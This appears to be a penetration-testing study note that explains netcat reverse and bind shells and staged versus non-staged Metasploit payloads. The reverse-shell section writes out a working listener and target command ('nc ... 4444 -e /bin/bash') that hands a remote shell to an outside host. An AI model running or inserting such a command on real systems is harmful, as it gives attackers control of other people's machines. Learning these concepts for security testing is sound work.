## Reverse Shell vs Bind shell
### Netcat Reverse Shell
- Most common
	- You use it 95% of the time
- A shell gives you access to a machine
	- Attackbox listens - target connects
- A reverse shell is a shell that allows a victim to connect to you
	- You can have netcat active on the attackbox listening on a port, and the target connects to your IP on the same port via netcat
- Port forward or port trigger is needed to connect the target's public IP to the attackbox's private IP
- Example connection
	- Attacker: `nc -nvlp 4444`
	- Target: `nc 192.168.57.6 4444 -e /bin/bash`

### Netcat Bind Shell
- Less common
	- Mostly on external assessments
- Most useful when you need to bypass a firewall or when reverse shell isn't working
- The attackbox connects to the target
	- Attackbox connects - target listens
- We open a port on the target via an exploit, then connect to it via netcat
- No need for port forwarding since we connect the attackbox's public IP to the target's private IP

## Staged vs Non-Staged Payloads
- A payload is what you run as an exploit
- There are different types of payloads
	- Windows payloads
	- Linux payloads
	- Meterpreter payload
		- An attack payload used in [[Hacking Tools#Metasploit |Metasploit]]
		- There are at least 500 payloads in [[Hacking Tools#Metasploit |Metasploit]] alone
- The main difference between a non-staged and a staged payload's syntax is the forward slash `/`
	- Non-staged
		- `windows/meterpreter_reverse_tcp`
	- Staged
		-  `windows/meterpreter/reverse_tcp`
### Staged payloads
- Sends exploit shell payload in stages
- Can be less stable than non-staged
### Non-Staged payloads
- Sends exploit shell code all at once
- Large in size than staged
- Doesn't always work
